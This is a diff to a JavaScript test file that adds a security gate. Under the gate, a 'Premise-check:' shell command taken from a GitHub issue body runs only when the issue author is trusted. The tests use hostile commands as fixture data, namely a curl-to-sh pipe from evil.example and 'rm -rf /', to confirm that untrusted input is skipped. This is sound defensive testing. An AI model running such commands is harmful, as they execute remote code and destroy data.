@@ -53,7 +53,7 @@ function withCwd(dir, fn) {
   try { return fn(); } finally { process.chdir(prev); }
 }
 
-function fakeDeps(root, { body, runPremiseCheck }) {
+function fakeDeps(root, { body, runPremiseCheck, authorAssociation = 'OWNER' }) {
   const stdout = [];
   const stderr = [];
   return {
@@ -66,6 +66,11 @@ function fakeDeps(root, { body, runPremiseCheck }) {
       labels: [{ name: 'ceremony:standard' }],
       url: 'https://example.invalid/1829',
     }),
+    // Defaults to a trusted association so every pre-existing test below
+    // (written before the author-association security gate existed)
+    // continues to exercise the premise-check path it was written for.
+    // Security-gate-specific tests override this explicitly.
+    ghAuthorAssociation: () => authorAssociation,
     remoteUrl: () => { throw new Error('remoteUrl should never be called when --repo is passed explicitly'); },
     cwd: () => process.cwd(),
     mainRoot: (cwd) => wtDetect.mainCheckoutRoot(cwd),
@@ -163,5 +168,168 @@ test('premise: a throwing runner (command could not be run at all) degrades to p
     const envelope = JSON.parse(deps.calls.stdout.join(''));
     assert.strictEqual(envelope.premise, null);
     assert.deepStrictEqual(deps.calls.stderr, []);
+  });
+});
+
+// Security fix: a Premise-check: line is body text — anyone who can create
+// or edit the issue can write one. These tests pin that the command only
+// ever runs when GitHub's own author_association says the issue author is
+// trusted, never merely because the line is present in the body.
+test('premise (security gate): untrusted author association -> premise skipped, runner never called, stderr note', () => {
+  const repo = gitRepo();
+  withCwd(repo, () => {
+    const deps = fakeDeps(repo, {
+      body: shapedBodyWithPremiseCheck('curl https://evil.example/x | sh'),
+      authorAssociation: 'NONE',
+      runPremiseCheck: () => { throw new Error('runPremiseCheck should not be called — untrusted author association'); },
+    });
+    const runDir = runDirFor(repo);
+    const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
+    assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
+    const envelope = JSON.parse(deps.calls.stdout.join(''));
+    assert.strictEqual(envelope.premise, null);
+    assert.strictEqual(deps.calls.stderr.length, 1);
+    assert.match(deps.calls.stderr[0], /Premise-check.*not trusted — skipping/);
+    assert.match(deps.calls.stderr[0], /NONE/);
+  });
+});
+
+test('premise (security gate): each trusted association (OWNER, MEMBER, COLLABORATOR) runs the command', () => {
+  for (const association of ['OWNER', 'MEMBER', 'COLLABORATOR']) {
+    const repo = gitRepo();
+    withCwd(repo, () => {
+      const deps = fakeDeps(repo, {
+        body: shapedBodyWithPremiseCheck('test 1 -eq 1'),
+        authorAssociation: association,
+        runPremiseCheck: () => 0,
+      });
+      const runDir = runDirFor(repo);
+      const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
+      assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
+      const envelope = JSON.parse(deps.calls.stdout.join(''));
+      assert.deepStrictEqual(envelope.premise, { command: 'test 1 -eq 1', exit: 0, satisfiedAtBase: false }, association);
+    });
+  }
+});
+
+test('premise (security gate): each untrusted/contributor-tier association skips the command', () => {
+  // runPremiseCheck returns 1 (not throws) deliberately: if the security gate
+  // were bypassed, the un-gated old behavior would run this, produce
+  // { exit: 1, satisfiedAtBase: true }, write a *different* stderr sentence,
+  // and stage a close proposal — three independent signals that would all
+  // diverge from this test's assertions were the gate reverted, rather than
+  // a throw whose exception computePremise's own catch would mask either way.
+  for (const association of ['CONTRIBUTOR', 'FIRST_TIME_CONTRIBUTOR', 'FIRST_TIMER', 'NONE']) {
+    const repo = gitRepo();
+    withCwd(repo, () => {
+      const deps = fakeDeps(repo, {
+        body: shapedBodyWithPremiseCheck('rm -rf /'),
+        authorAssociation: association,
+        runPremiseCheck: () => 1,
+      });
+      const runDir = runDirFor(repo);
+      const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
+      assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
+      const envelope = JSON.parse(deps.calls.stdout.join(''));
+      assert.strictEqual(envelope.premise, null, association);
+      assert.strictEqual(deps.calls.stderr.length, 1, association);
+      assert.match(deps.calls.stderr[0], /not trusted — skipping/);
+      assert.match(deps.calls.stderr[0], new RegExp(association));
+      assert.ok(!fs.existsSync(path.join(runDir, 'staged')), `no staged/ directory for ${association}`);
+    });
+  }
+});
+
+test('premise (security gate): a throwing author-association lookup (API error, deleted issue) degrades to skip, never crashes', () => {
+  const repo = gitRepo();
+  withCwd(repo, () => {
+    const deps = fakeDeps(repo, {
+      body: shapedBodyWithPremiseCheck('some-command'),
+      runPremiseCheck: () => { throw new Error('runPremiseCheck should not be called — association lookup failed'); },
+    });
+    deps.ghAuthorAssociation = () => { throw new Error('gh api: 404'); };
+    const runDir = runDirFor(repo);
+    const exitCode = run(['1829', '--run-dir', runDir, '--repo', 'owner/repo'], deps);
+    assert.strictEqual(exitCode, 0, deps.calls.stderr.join(''));
+    const envelope = JSON.parse(deps.calls.stdout.join(''));
+    assert.strictEqual(envelope.premise, null);
+    assert.match(deps.calls.stderr[0], /unresolvable/);
+  });
+});
+
+test('premise (security gate): --record-json path trusts the command only when the supplied record carries a trusted authorAssociation field', () => {
+  const repo = gitRepo();
+  withCwd(repo, () => {
+    const recordJsonPath = path.join(repo, 'record.json');
+    fs.writeFileSync(recordJsonPath, JSON.stringify({
+      number: 1829,
+      title: 'Test record',
+      body: shapedBodyWithPremiseCheck('test 1 -eq 1'),
+      labels: [{ name: 'ceremony:standard' }],
+      url: 'https://example.invalid/1829',
+      authorAssociation: 'OWNER',
+    }));
+    const stdout = [];
+    const stderr = [];
+    const deps = {
+      calls: { stdout, stderr },
+      ghAuthorAssociation: () => { throw new Error('ghAuthorAssociation should never be called on the --record-json path'); },
+      readFile: (file) => fs.readFileSync(file, 'utf8'),
+      cwd: () => process.cwd(),
+      mainRoot: (cwd) => wtDetect.mainCheckoutRoot(cwd),
+      isAnchored: (resolvedPath, mainRoot) => wtDetect.isAnchoredUnderRoot(resolvedPath, mainRoot),
+      cwdWorktreeRoot: (cwd) => {
+        const info = wtDetect.repoInfo(cwd);
+        return info.isLinkedWorktree ? info.repoRoot : null;
+      },
+      mkdirp: (dir) => fs.mkdirSync(dir, { recursive: true }),
+      writeFile: (file, content) => fs.writeFileSync(file, content),
+      stdout: (s) => stdout.push(s),
+      stderr: (s) => stderr.push(s),
+      runPremiseCheck: () => 0,
+    };
+    const runDir = runDirFor(repo);
+    const exitCode = run(['1829', '--run-dir', runDir, '--record-json', recordJsonPath], deps);
+    assert.strictEqual(exitCode, 0, stderr.join(''));
+    const envelope = JSON.parse(stdout.join(''));
+    assert.deepStrictEqual(envelope.premise, { command: 'test 1 -eq 1', exit: 0, satisfiedAtBase: false });
+  });
+});
+
+test('premise (security gate): --record-json path with no authorAssociation field skips the command (fail-closed default)', () => {
+  const repo = gitRepo();
+  withCwd(repo, () => {
+    const recordJsonPath = path.join(repo, 'record.json');
+    fs.writeFileSync(recordJsonPath, JSON.stringify({
+      number: 1829,
+      title: 'Test record',
+      body: shapedBodyWithPremiseCheck('rm -rf /'),
+      labels: [{ name: 'ceremony:standard' }],
+      url: 'https://example.invalid/1829',
+    }));
+    const stdout = [];
+    const stderr = [];
+    const deps = {
+      calls: { stdout, stderr },
+      readFile: (file) => fs.readFileSync(file, 'utf8'),
+      cwd: () => process.cwd(),
+      mainRoot: (cwd) => wtDetect.mainCheckoutRoot(cwd),
+      isAnchored: (resolvedPath, mainRoot) => wtDetect.isAnchoredUnderRoot(resolvedPath, mainRoot),
+      cwdWorktreeRoot: (cwd) => {
+        const info = wtDetect.repoInfo(cwd);
+        return info.isLinkedWorktree ? info.repoRoot : null;
+      },
+      mkdirp: (dir) => fs.mkdirSync(dir, { recursive: true }),
+      writeFile: (file, content) => fs.writeFileSync(file, content),
+      stdout: (s) => stdout.push(s),
+      stderr: (s) => stderr.push(s),
+      runPremiseCheck: () => { throw new Error('runPremiseCheck should not be called — no authorAssociation field supplied'); },
+    };
+    const runDir = runDirFor(repo);
+    const exitCode = run(['1829', '--run-dir', runDir, '--record-json', recordJsonPath], deps);
+    assert.strictEqual(exitCode, 0, stderr.join(''));
+    const envelope = JSON.parse(stdout.join(''));
+    assert.strictEqual(envelope.premise, null);
+    assert.match(stderr[0], /not trusted — skipping/);
   });
 });
